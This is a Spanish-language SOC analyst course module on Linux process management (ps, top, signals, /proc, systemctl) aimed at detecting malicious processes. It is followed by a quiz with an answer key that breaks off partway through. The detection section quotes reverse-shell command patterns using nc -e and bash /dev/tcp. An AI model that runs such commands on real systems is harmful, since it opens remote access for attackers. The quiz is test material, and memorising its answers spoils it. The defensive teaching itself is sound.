**📘 Carrera de Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>**

**Semana 3 – Linux**

**Módulo 18 – Gestión de Procesos**

**Nivel:** Principiante → Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel 1

**Antes de comenzar**

Ya dominas:

- ✅ Modelo <a href="../../GLOSARIO.md#osi" target="_blank">OSI</a> y <a href="../../GLOSARIO.md#tcp" target="_blank">TCP</a>/<a href="../../GLOSARIO.md#ip" target="_blank">IP</a>

- ✅ <a href="../../GLOSARIO.md#tcp" target="_blank">TCP</a> y <a href="../../GLOSARIO.md#udp" target="_blank">UDP</a>

- ✅ Puertos

- ✅ <a href="../../GLOSARIO.md#dns" target="_blank">DNS</a>, <a href="../../GLOSARIO.md#dhcp" target="_blank">DHCP</a>, <a href="../../GLOSARIO.md#http" target="_blank">HTTP</a> y <a href="../../GLOSARIO.md#https" target="_blank">HTTPS</a>

- ✅ Introducción a Linux y la Terminal (<a href="../../GLOSARIO.md#cli" target="_blank">CLI</a>)

- ✅ Estructura del Sistema de Archivos (<a href="../../GLOSARIO.md#fhs" target="_blank">FHS</a>)

- ✅ Permisos de Archivos (rwx)

- ✅ Gestión de Usuarios y Grupos

Ahora vamos a responder una pregunta clave: ¿qué está haciendo el
sistema en este momento?

Los **procesos** son la respuesta.

Un proceso es un programa en ejecución.

Todo lo que ocurre en Linux pasa a través de procesos.

Para un Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>, los procesos son información de oro.

Un proceso sospechoso puede ser la primera señal de malware, minería de
criptomonedas o actividad maliciosa.

El analista debe saber listarlos, interpretarlos y detectar los
sospechosos.

**🎯 Objetivos de aprendizaje**

Al finalizar este módulo podrás:

- Comprender qué es un proceso y en qué se diferencia de un programa.

- Interpretar los conceptos de <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> y PPID.

- Listar los procesos activos con `ps aux` y `ps -ef`.

- Monitorear el sistema en tiempo real con `top` y `htop`.

- Reconocer los estados de un proceso (R, S, D, Z, T).

- Enviar señales a los procesos con `kill`.

- Ejecutar procesos en segundo plano con `&`, `jobs`, `fg` y `bg`.

- Explorar información de procesos en `/proc`.

- Gestionar servicios y daemons con `systemctl`.

- Detectar procesos anómalos como indicador de compromiso.

- Aplicar estos conocimientos en investigaciones de un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>.

- Responder preguntas técnicas de una entrevista para Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel
1.

**1. ¿Qué es un proceso?**

Un **proceso** es un programa en ejecución.

Un **programa** es un archivo guardado en el disco: `/usr/bin/python3`,
`/usr/sbin/nginx`, `/bin/bash`.

Un **proceso** es ese programa corriendo en la memoria.

Cada vez que ejecutas un programa, el sistema crea un proceso con su
propio espacio de memoria, sus recursos y su estado.

**Analogía de la oficina**

El **programa** es el manual de trabajo guardado en un cajón.

El **proceso** es el empleado que toma el manual y trabaja en su
escritorio.

Puedes tener un solo manual (programa) y muchos empleados trabajando con
él (procesos).

Abre <a href="../../GLOSARIO.md#dos" target="_blank">dos</a> terminales y ejecuta el mismo comando: el programa es el mismo,
pero Linux crea **<a href="../../GLOSARIO.md#dos" target="_blank">dos</a> procesos distintos**.

**El <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>**

Cada proceso tiene un número único: el **<a href="../../GLOSARIO.md#pid" target="_blank">PID</a> (Process Identifier)**.

Es como el **número de empleado** de cada proceso.

**El PPID**

Cada proceso tiene también un **PPID (Parent Process Identifier)**.

El PPID indica quién creó a ese proceso: es como el **jefe** que lo
supervisa.

Todo proceso tiene un padre.

Cuando un proceso crea otro, el nuevo es su **hijo**.

Proceso padre (PPID) → Crea → Proceso hijo (<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>)

**¿Por qué importa esto en un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>?**

Porque el malware casi siempre es un proceso hijo.

Un proceso legítimo que lanza un proceso extraño es una gran señal de
alerta.

Por ejemplo: un servidor web (nginx) que lanza una `bash`, o un proceso
del sistema que ejecuta un binario desde `/tmp`.

Esa relación padre-hijo se analiza en cada investigación.

**El primer proceso: <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1**

En Linux existe un primer proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> **1**.

Es el ancestro de todos los demás procesos.

En los sistemas modernos es **systemd**; en los antiguos era **init**.

Todo lo que corre en Linux desciende del <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1.

Si ves un proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1 que no es systemd ni init, es motivo de
alarma.

**2. ¿Por qué es importante para un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>?**

El malware siempre deja rastros.

Uno de los rastros más evidentes es un **proceso**.

Un **minero de criptomonedas** consume muchísima CPU.

Una **reverse <a href="../../GLOSARIO.md#shell" target="_blank">shell</a>** aparece como un proceso de red inusual.

Un **comando malicioso** se ve en la lista de procesos.

Un **servicio falso** se inicia con el sistema.

Ningún malware puede ejecutarse sin crear un proceso.

Por eso los analistas <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> revisan procesos constantemente.

**Correlación con el <a href="../../GLOSARIO.md#edr" target="_blank">EDR</a>**

Un **<a href="../../GLOSARIO.md#edr" target="_blank">EDR</a> (Endpoint Detection and Response)** recopila datos de los
procesos de cada equipo: nombre, <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> y PPID, usuario, ruta del
ejecutable, uso de CPU y memoria, y línea de comandos.

Cuando llega una alerta al <a href="../../GLOSARIO.md#siem" target="_blank">SIEM</a>, el primer paso suele ser: ¿qué proceso
generó este evento?

Saber analizar procesos a mano te permite validar lo que el <a href="../../GLOSARIO.md#edr" target="_blank">EDR</a> reporta.

**3. Listar procesos con `ps`**

El comando básico es `ps` (**process status**).

**`ps aux`**

Es la variante más usada por los analistas.

Muestra todos los procesos del sistema.

Ejemplo:

`ps aux`

Salida típica:

USER <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND

<a href="../../GLOSARIO.md#root" target="_blank">root</a> 1 0.0 0.0 166000 11660 ? Ss 09:15 0:01 /sbin/init

www-data 732 0.1 0.5 230000 45000 ? S 09:16 0:02 nginx: worker

jo 1240 2.3 1.2 340000 90000 pts/0 S 10:02 0:05 <a href="../../GLOSARIO.md#bash" target="_blank">bash</a>

**`ps -ef`**

Es la otra variante estándar e incluye el **PPID** directamente.

Ejemplo:

`ps -ef`

Salida típica:

UID <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> PPID C STIME TTY TIME CMD

<a href="../../GLOSARIO.md#root" target="_blank">root</a> 1 0 0 09:15 ? 00:00:01 /sbin/init

www-data 732 1 0 09:16 ? 00:00:02 nginx: worker

jo 1240 732 0 10:02 pts/0 00:00:05 <a href="../../GLOSARIO.md#bash" target="_blank">bash</a>

**¿Cuál usar?**

- `ps aux` → visión general y uso de recursos.

- `ps -ef` → relación padre-hijo con el PPID.

Ambos son válidos y los usarás a diario.

**4. Las columnas de `ps aux`**

**USER** → quién ejecuta el proceso.

Puede ser `root`, `www-data`, `jo` o `nobody`.

Un proceso de sistema debe correr como `root`.

Un servidor web corre como `www-data`.

Si un proceso de sistema lo ejecuta un usuario raro, investiga.

**<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** → el identificador único del proceso.

**%CPU** → porcentaje de CPU que consume.

Valores constantes altos (200%, 300%) son una señal roja.

**%MEM** → porcentaje de memoria RAM que consume.

**VSZ y RSS** → memoria virtual y memoria física usada.

**TTY** → la terminal asociada al proceso.

Un `?` significa que no tiene terminal.

Es normal para daemons y servicios.

**STAT** → el estado del proceso.

**START** → la hora en que se inició.

Un proceso del sistema iniciado en un momento extraño es sospechoso.

**TIME** → el tiempo total de CPU acumulado.

**COMMAND** → la línea de comandos completa.

Aquí se esconde la verdad: ves exactamente qué se está ejecutando.

**Regla de oro**

No mires solo el nombre; mira la **línea de comandos completa**.

Un proceso llamado `nginx` corriendo desde `/tmp` no es `nginx`.

**Filtrar y buscar procesos**

`ps aux | grep nginx` → busca las líneas con "nginx".

`ps -u www-data` → procesos de un usuario concreto.

`ps -p 732` → información del proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 732.

`ps aux | grep miner` → busca indicios de mineros.

El propio `grep` aparece en la salida; es normal.

Puedes evitar verlo con `grep -v grep`.

**5. Monitoreo en tiempo real con `top`**

`ps` muestra una fotografía del momento.

`top` muestra una pantalla **en vivo** que se actualiza.

Ejemplo:

`top`

Tiene <a href="../../GLOSARIO.md#dos" target="_blank">dos</a> zonas: la cabecera con la información del sistema y la lista
de procesos ordenada por consumo.

La cabecera muestra la carga media (load average), los procesos totales
y el uso de CPU y memoria.

Las columnas son similares a `ps aux`: <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>, USER, PR/NI, VIRT/RES, S,
%CPU, %MEM, TIME+ y COMMAND.

La tecla `P` ordena por %CPU.

La tecla `M` ordena por %MEM.

Presiona `q` para salir.

Desde la terminal puedes lanzarlo ya ordenado:

`top -o %CPU`

**`htop`**

`htop` es una versión interactiva y con colores de `top`.

Permite desplazarte, buscar y terminar procesos.

**Importante**

`htop` no está en todos los servidores; `top` sí.

En un servidor comprometido puedes quedarte con `top`.

**¿Qué busca un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> en `top`?**

- Un proceso con %CPU altísimo.

- Un proceso desconocido consumiendo recursos.

- Un proceso cuyo nombre no coincide con su ruta.

**6. Estados de un proceso**

Cada proceso tiene un estado.

Se ve en la columna **STAT** de `ps` o **S** de `top`.

| **Letra** | **Estado**               | **Qué significa**                              |
|-----------|--------------------------|-----------------------------------------------|
| R         | Running                  | Se está ejecutando o listo para ejecutarse.    |
| S         | Sleeping                 | Dormido, esperando algo. Es lo más común.      |
| D         | Uninterruptible Sleep    | Esperando E/S, no puede ser interrumpido.      |
| Z         | Zombie                   | Terminó pero su padre no lo recogió.           |
| T         | Stopped                  | Detenido, normalmente por una señal.           |

**R (Running)** → el proceso está usando la CPU.

**S (Sleeping)** → espera un evento, una entrada o una respuesta.

Es el estado más habitual.

**D (Uninterruptible Sleep)** → espera operaciones de entrada y salida
(E/S) y no responde a señales normales.

Muchos procesos en D pueden indicar un problema de disco.

**Z (Zombie)** → el proceso ya terminó, pero su padre no confirmó la
finalización.

Queda como un "fantasma" en la tabla de procesos.

No consume CPU.

Pero acumular muchos zombis puede indicar: un programa mal escrito, un
padre que no limpia sus hijos o un proceso terminado de forma rara.

Un atacante podría dejar zombis tras matar su herramienta.

Muchos zombis → investiga quién es el padre.

**T (Stopped)** → el proceso fue detenido, normalmente con SIGSTOP o
`Ctrl+Z`.

En `ps` verás combinaciones como `Ss`, `S+`, `R+` o `Ssl`.

No las memorices todas: interpreta R, S, D, Z y T.

**7. Señales y `kill`**

Una **señal** es un mensaje que el sistema envía a un proceso.

El comando para enviar señales es `kill`.

**Las señales más importantes**

| **Señal** | **Número** | **Qué hace**                                    |
|-----------|------------|-------------------------------------------------|
| SIGHUP    | 1          | Cuelga la línea. Los daemons suelen recargarse. |
| SIGINT    | 2          | Interrumpe, como `Ctrl+C`.                      |
| SIGTERM   | 15         | Terminación elegante. Es la señal por defecto.  |
| SIGKILL   | 9          | Terminación forzada e inmediata.                |
| SIGSTOP   | 19         | Detiene el proceso (no lo mata).                |
| SIGCONT   | 18         | Reanuda un proceso detenido.                    |

**SIGTERM = 15**

Es la forma **educada** de pedir que un proceso termine.

El proceso puede guardar datos, cerrar archivos y liberar recursos.

`kill 1234` equivale a `kill -15 1234`.

**SIGKILL = 9**

Es la forma **brusca**.

El <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a> mata el proceso de inmediato.

El proceso **no puede** guardar nada ni reaccionar.

Ningún proceso puede ignorar SIGKILL.

Se usa solo cuando el proceso no responde.

**Diferencia clave**

- **SIGTERM:** "Por favor, termina." → Ordenado.

- **SIGKILL:** "Termina ya." → Forzado e inmediato.

Analogía: SIGTERM es despedir a un empleado con preaviso para que
entregue su escritorio; SIGKILL es sacarlo del edificio sin avisar.

**SIGHUP = 1**

Originalmente significaba "se cayó la línea telefónica".

Hoy los daemons la usan para recargar su configuración.

**SIGSTOP = 19** detiene el proceso sin matarlo ("congelarlo").

Se reanuda con SIGCONT (18).

**Enviar señales por nombre**

`killall nombre` mata todos los procesos con ese nombre.

Ejemplo:

`killall xmrig`

**Comprobar procesos**

`pgrep -a bash` muestra los PIDs y el comando.

`pidof nginx` muestra los PIDs del servicio nginx.

**8. Foreground y background**

Los procesos pueden ejecutarse en primer plano (foreground) o en
segundo plano (background).

Un comando normal bloquea la terminal hasta que termina.

Añades `&` al final para ejecutarlo en segundo plano.

Ejemplo:

`sleep 300 &`

El proceso corre y la terminal queda libre.

Linux muestra: `[1] 4123`.

- `[1]` → número de trabajo (job).

- `4123` → <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> del proceso.

**Ver los trabajos**

`jobs` muestra los trabajos del <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> actual.

**Traer un trabajo al primer plano**

`fg` trae el último trabajo.

`fg %1` trae el trabajo número 1.

**Enviar un trabajo al segundo plano**

`bg` envía el último trabajo al fondo.

`bg %1` envía el trabajo 1 al fondo.

**Detener un proceso en primer plano**

`Ctrl+Z` detiene (pausa) el proceso en primer plano.

No lo termina: queda detenido (estado T).

Luego puedes enviarlo al fondo con `bg`.

**Hacer que un proceso sobreviva al cierre**

`nohup comando &`

`nohup` significa **no hang up**.

El proceso ignora la señal SIGHUP y sigue corriendo aunque cierres la
terminal.

Ejemplo:

`nohup ./minero &`

Pero recuerda: si eso es un minero, tú lo que harás es matarlo.

**9. El directorio `/proc`**

`/proc` es un sistema de archivos **virtual**.

No existe en el disco: lo genera el <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a> en memoria.

Contiene información de todos los procesos.

Cada proceso tiene su carpeta:

`/proc/PID`

Ejemplo:

`/proc/1234`

**Archivos útiles**

| **Archivo**          | **Qué contiene**                          |
|----------------------|-------------------------------------------|
| `/proc/PID/cmdline`  | La línea de comandos completa.            |
| `/proc/PID/environ`  | Las variables de entorno.                 |
| `/proc/PID/cwd`      | El directorio de trabajo actual.          |
| `/proc/PID/exe`      | Un enlace al ejecutable real.             |
| `/proc/PID/status`   | Estado del proceso en detalle.            |
| `/proc/PID/stat`     | Estadísticas del proceso.                 |

**Ver la línea de comandos**

`cat /proc/1234/cmdline`

**Ver las variables de entorno**

`cat /proc/1234/environ`

Puede revelar usuarios, rutas, C2 o credenciales mal guardadas.

**Ver el directorio de trabajo**

`ls -l /proc/1234/cwd`

Un proceso malicioso suele correr desde `/tmp`, `/dev/shm` o
`/var/tmp`.

**Ver el ejecutable real**

`ls -l /proc/1234/exe`

Revela la ruta verdadera del binario.

Un proceso llamado `httpd` que apunta a `/tmp/...` es sospechoso.

**¿Por qué es importante en un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>?**

Porque los nombres pueden mentir.

`/proc` muestra la verdad.

**10. Servicios y daemons**

Un **<a href="../../GLOSARIO.md#daemon" target="_blank">daemon</a>** es un proceso que corre en segundo plano sin interacción
del usuario.

Ejemplos: `nginx`, `sshd`, `mysqld`.

Suelen terminar en **d** (<a href="../../GLOSARIO.md#daemon" target="_blank">daemon</a>).

**systemd**

Es el sistema de inicio de Linux moderno.

Gestiona los servicios del sistema.

Es el proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1 en la mayoría de las distros.

**Comandos básicos con `systemctl`**

`systemctl status nginx` → estado del servicio, su <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> y sus logs.

`systemctl start nginx` → inicia el servicio.

`systemctl stop nginx` → lo detiene.

`systemctl restart nginx` → lo reinicia.

`systemctl enable nginx` → lo activa al arrancar.

`systemctl disable nginx` → lo quita del arranque.

**Listar servicios**

`systemctl list-units --type=service` → servicios activos.

`systemctl list-unit-files | grep enabled` → servicios que inician con
el sistema.

**¿Por qué es importante en un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>?**

Los atacantes instalan persistencia como servicios.

Un servicio nuevo y desconocido es un gran indicador de compromiso.

Si `systemctl status mysteryservice` muestra algo que no está en tu
baseline, investiga.

**11. ¿Cómo aprovechan esto los atacantes?**

Los atacantes usan los procesos para ejecutar su código.

**Ataque 1 – Minero de criptomonedas**

El atacante instala un software de minería que consume muchísima CPU.

Señales: %CPU altísimo (200%, 300%, 500%), nombre raro o genérico y
ejecutable en `/tmp`.

Ejemplo:

`ps aux | grep -i xmr`

Aparece un proceso `xmrig` o similar.

O con nombre camuflado como `crond` o `systemd-httpd`.

**Ataque 2 – Malware disfrazado con nombre legítimo**

El atacante copia el malware a `/tmp` y lo renombra como un proceso del
sistema.

Ejemplos: un `[kworker]` falso, un `httpd` corriendo desde `/tmp`, un
`systemd` con una ruta rara o un `bash` en un directorio inesperado.

Los `kworker` reales van entre corchetes: `[kworker/0:1]`.

Un `kworker` real nunca muestra un binario; uno falso suele mostrar una
ruta.

**Cómo detectarlo**

`ls -l /proc/PID/exe` o `cat /proc/PID/cmdline`.

El nombre puede mentir; la ruta no.

**Ataque 3 – Proceso hijo lanzado desde un proceso legítimo**

El atacante compromete una aplicación y esta lanza un proceso
malicioso.

Ejemplos: `bash` como hijo de `nginx`, Python como hijo de `apache`, o
una <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> lanzada desde `php-fpm`.

**Cómo detectarlo**

Compara el PPID con el padre.

Un proceso `bash` cuyo PPID es el servidor web es muy sospechoso.

`ps -ef | grep -E "bash|python|nc"` y revisa la columna PPID.

**Ataque 4 – Reverse <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> como proceso de red**

El atacante abre una <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> hacia su servidor.

Aparecen procesos como `nc -e /bin/bash`, `<a href="../../GLOSARIO.md#bash" target="_blank">bash</a> -i >&
/dev/<a href="../../GLOSARIO.md#tcp" target="_blank">tcp</a>/<a href="../../GLOSARIO.md#ip" target="_blank">IP</a>/PORT 0>&1`, `socat` o `ncat`.

Señales en `ps`: shells raras, combinaciones con `/dev/tcp` y conexiones
de red desde procesos que no deberían tenerlas.

Se combina con:

`ss -tulpn`

`netstat -tulpn`

Para ver qué proceso mantiene la conexión.

**Ataque 5 – Persistencia mediante servicios**

El atacante crea un servicio para sobrevivir al reinicio.

Ejemplo:

`systemctl enable backdoor.service`

O modifica un servicio legítimo.

Señales: un servicio nuevo, un servicio activo sin explicación, un
binario de un servicio en `/tmp` o un servicio que ejecuta scripts en
cada inicio.

**Cómo detectarlo**

`systemctl list-units --type=service` y compara con tu baseline.

**12. ¿Cómo defenderse?**

- Monitorear procesos de forma continua.

- Establecer un **baseline** de procesos esperados.

- Correlacionar con el <a href="../../GLOSARIO.md#edr" target="_blank">EDR</a> y el <a href="../../GLOSARIO.md#siem" target="_blank">SIEM</a>.

- Revisar los servicios activos contra lo conocido.

- Investigar cualquier %CPU anómalo.

- Revisar procesos en horarios críticos.

- Prestar atención a binarios que corren desde `/tmp`.

- Verificar procesos con PPID extraños.

- Revisar la línea de comandos completa, no solo el nombre.

- Analizar conexiones con `ss -tulpn`.

- Alertar cuando un proceso legítimo lanza hijos inesperados.

**Baseline**

Documenta qué procesos son normales en cada servidor.

Ejemplo de un servidor web: nginx, mysqld, sshd, cron y systemd.

Todo lo que no esté en el baseline debe investigarse.

**13. Aplicación práctica en un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>**

**Caso 1 – Un proceso con 300% de CPU**

`top` muestra un proceso desconocido usando 300% de CPU, con nombre raro
y usuario inusual.

Posible interpretación: minería de criptomonedas o malware que consume
recursos.

Investigación: ver el <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>, revisar `ls -l /proc/PID/exe`, el usuario, el
PPID y `ss -tulpn`, y terminar el proceso si se confirma.

**Caso 2 – Un binario en `/tmp` ejecutado por www-data**

`ps aux` muestra:

www-data 1502 0.0 0.1 ... /tmp/.payload

Posible interpretación: webshell desplegada por un atacante o payload
cargado desde una vulnerabilidad web.

Investigación: revisar la línea de comandos, los logs del servidor web,
buscar otros binarios en `/tmp` y correlacionar con el PPID y el <a href="../../GLOSARIO.md#edr" target="_blank">EDR</a>.

**Caso 3 – Procesos de red raros**

`ps aux` muestra procesos como `nc`, `socat` o `ncat`, o un `bash` con
`/dev/tcp`.

Posible interpretación: reverse <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> activa o comunicación con un C2.

Investigación: `netstat -tulpn`, `ss -tulpn`, identificar la <a href="../../GLOSARIO.md#ip" target="_blank">IP</a> y el
puerto de destino, buscar el origen en el firewall y revisar el padre.

**Caso 4 – Un servicio recién instalado**

`systemctl list-units --type=service` muestra un servicio desconocido.

Posible interpretación: persistencia de un atacante o software
malicioso instalado.

Investigación: `systemctl status nombre`, revisar el archivo del
servicio en `/etc/systemd/system`, revisar el binario que ejecuta y
comprobar cuándo se creó.

**Combinación clave**

Los procesos se correlacionan con la red.

`ps aux` te dice qué corre; `ss -tulpn` te dice quién se conecta a la
red.

Juntas forman la foto completa de un incidente.

**14. Lo que esperan de un Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel 1**

Cuando llegue una alerta, deberás responder preguntas como:

- ¿Qué procesos hay corriendo en este equipo?

- ¿Quién los ejecuta?

- ¿Qué %CPU consumen?

- ¿Hay conexiones de red raras?

- ¿Los servicios son legítimos?

- ¿La línea de comandos coincide con el nombre?

- ¿El PPID es el esperado?

- ¿Algo corre desde `/tmp`?

No se trata solo de listar procesos; se trata de **interpretarlos**.

**15. Resumen**

**Proceso**

- Es un programa en ejecución.

- Tiene un <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> único y un PPID (su padre).

- Todos descienden del <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1.

**Comandos principales**

- `ps aux` → lista todos los procesos.

- `ps -ef` → lista con PPID.

- `top` → monitoreo en tiempo real.

- `top -o %CPU` → ordenado por CPU.

- `kill -15 PID` → terminar de forma elegante.

- `kill -9 PID` → terminar de forma forzada.

- `killall nombre` → terminar por nombre.

- `jobs`, `fg`, `bg` → gestionar trabajos.

- `nohup comando &` → proceso que sobrevive.

- `systemctl status servicio` → estado de un servicio.

- `ss -tulpn` → conexiones y procesos.

**Estados**

- R → running.

- S → sleeping.

- D → esperando E/S.

- Z → zombie.

- T → detenido.

**Señales**

- SIGTERM = 15.

- SIGKILL = 9.

- SIGHUP = 1.

- SIGSTOP = 19.

**Señales de alerta**

- %CPU altísimo.

- Binarios en `/tmp`.

- Nombres falsos de procesos del sistema.

- Hijos inesperados de procesos legítimos.

- Servicios desconocidos.

- Conexiones de red raras.

**🧠 Conceptos clave para memorizar**

| **Concepto**      | **Debes recordar**                                            |
|-------------------|---------------------------------------------------------------|
| Proceso           | Un programa en ejecución.                                     |
| <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>               | Identificador único del proceso.                              |
| PPID              | Identificador del proceso padre.                              |
| <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1             | El primer proceso: systemd (o init).                          |
| `ps aux`          | Lista todos los procesos del sistema.                         |
| `top`             | Monitoreo en tiempo real.                                     |
| R                 | Running.                                                      |
| S                 | Sleeping.                                                     |
| Z                 | Zombie.                                                       |
| SIGTERM           | Señal 15, terminación elegante.                               |
| SIGKILL           | Señal 9, terminación forzada.                                 |
| Background        | Ejecutar en segundo plano con `&`.                            |
| <a href="../../GLOSARIO.md#daemon" target="_blank">Daemon</a>            | Proceso que corre en segundo plano.                           |
| systemd           | Gestor de servicios, proceso <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1.                           |
| `/proc`           | Sistema virtual con datos de procesos.                        |
| `/proc/PID/exe`   | La ruta real del ejecutable.                                  |
| `ss -tulpn`       | Muestra conexiones de red y su proceso.                       |

**🎓 Consejo como tu instructor de <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>**

Vas a vivir en la terminal.

`ps aux` y `top` serán tus primeros comandos ante cualquier alerta de
endpoint.

Entrena tu mente para hacer asociaciones rápidas.

- **%CPU alto + proceso desconocido** = sospechoso.

- **Proceso corriendo desde `/tmp`** = sospechoso.

- **Proceso con nombre de sistema en una ruta rara** = sospechoso.

- **Proceso legítimo lanzando una <a href="../../GLOSARIO.md#shell" target="_blank">shell</a>** = sospechoso.

- **Servicio nuevo que no está en tu baseline** = sospechoso.

- **Conexión de red desde un proceso inesperado** = sospechoso.

**Regla del nombre vs la ruta**

El nombre puede mentir; la ruta no.

`/proc/PID/exe` siempre dice la verdad.

**Regla del padre**

Pregunta siempre: ¿quién creó este proceso?

Un proceso sin padre esperado tiene una historia que contar.

**Piensa como un analista**

Cuando mires `top` y veas un proceso usando 300% de CPU, no pienses
"raro".

Piensa: "¿Qué es? ¿De dónde salió? ¿Quién lo lanzó? ¿A dónde se
conecta?"

Esa secuencia de preguntas es la que te hará crecer en el <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>.

Los procesos son los actores del sistema.

Tu trabajo es saber quién está en el escenario.

---

**📘 Carrera de Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>**

**Semana 3 – Linux**

**Evaluación – Módulo 18: Gestión de Procesos**

**Nivel:** Principiante → Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel 1

**Instrucciones:** Responde las siguientes preguntas sin consultar el
material de estudio. Piensa como si estuvieras realizando una prueba
para ingresar a un **<a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel 1**. Encontrarás preguntas teóricas y
casos prácticos basados en situaciones reales. Al finalizar encontrarás
las respuestas con su justificación.

**Pregunta 1**

¿Qué es un **proceso** en Linux?

**A)** Un archivo de configuración del sistema.

**B)** Un programa que está en ejecución.

**C)** Un usuario con permisos de administrador.

**D)** Un protocolo de red.

**Pregunta 2**

¿Cuál es la diferencia entre el **<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** y el **PPID** de un proceso?

**A)** El <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> identifica al proceso y el PPID identifica a su proceso
padre.

**B)** El <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> indica la memoria usada y el PPID el uso de CPU.

**C)** Ambos son exactamente lo mismo.

**D)** El PPID identifica al proceso y el <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> a su proceso padre.

**Pregunta 3**

¿Para qué sirve el directorio **`/proc`** en Linux?

**A)** Almacenar los registros (logs) del sistema.

**B)** Es un sistema de archivos virtual con información de los procesos.

**C)** Guardar las contraseñas de los usuarios.

**D)** Configurar las interfaces de red.

**Pregunta 4**

¿Qué comando se utiliza para **listar todos los procesos** del sistema
con información de usuario, CPU y memoria?

**A)** `ls -la`

**B)** `ps aux`

**C)** `pwd`

**D)** `cat /etc/passwd`

**Pregunta 5**

En `top`, un proceso desconocido que ocupa el primer puesto con un
**%CPU muy alto** podría indicar:

**A)** Un proceso normal del sistema sin relevancia.

**B)** Un posible minero de criptomonedas o malware que consume recursos.

**C)** Un problema exclusivamente de red.

**D)** Una actualización del <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a>.

**Pregunta 6**

¿Cuál es la diferencia principal entre **SIGTERM (15)** y **SIGKILL
(9)**?

**A)** No hay diferencia entre ambas.

**B)** SIGTERM es una terminación elegante; SIGKILL es forzada e
inmediata.

**C)** SIGKILL permite guardar datos; SIGTERM no.

**D)** SIGTERM solo funciona con procesos detenidos.

**Pregunta 7**

Un proceso se muestra en la lista con la letra **Z**. ¿Qué significa?

**A)** Que se está ejecutando en primer plano.

**B)** Que es un **zombie**: terminó pero su padre no lo recogió.

**C)** Que está detenido por una señal.

**D)** Que espera operaciones de entrada y salida.

**Pregunta 8**

¿Qué comando permite ejecutar un proceso en **segundo plano**?

**A)** `kill -9 PID`

**B)** `comando &`

**C)** `systemctl restart comando`

**D)** `cat comando`

**Pregunta 9**

¿Qué comando de `systemctl` muestra si un servicio está **activo**, su
**<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** y sus últimos **logs**?

**A)** `systemctl status nginx`

**B)** `systemctl start nginx`

**C)** `systemctl enable nginx`

**D)** `systemctl disable nginx`

**Pregunta 10 (Caso práctico <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>)**

En `top` observas un proceso desconocido que consume **300% de CPU** y
cuyo ejecutable se encuentra en **`/tmp`**.

¿Cuál sería la hipótesis más razonable?

**A)** Es el servidor web legítimo del sistema.

**B)** Un posible minero de criptomonedas o malware ejecutándose desde
una ubicación inusual.

**C)** El proceso del <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a> `kworker` normal.

**D)** Un proceso del sistema `systemd` legítimo.

**✅ Respuestas y justificación**

**Pregunta 1**

✅ **Respuesta correcta: B**

**Justificación**

Un **proceso** es un **programa en ejecución**.

El programa es el archivo en el disco; el proceso es ese programa
corriendo en la memoria.

**Pregunta 2**

✅ **Respuesta correcta: A**

**Justificación**

El **<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** es el identificador único del proceso.

El **PPID** es el identificador del proceso **padre** que lo creó.

Analizar la relación padre-hijo es clave para detectar malware.

**Pregunta 3**

✅ **Respuesta correcta: B**

**Justificación**

**`/proc`** es un sistema de archivos **virtual** generado por el <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a>
en memoria.

Contiene información de todos los procesos.

Por ejemplo, `/proc/PID/exe` revela la ruta real del ejecutable.

**Pregunta 4**

✅ **Respuesta correcta: B**

**Justificación**

`ps aux` lista **todos los procesos** con columnas como USER, <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>,
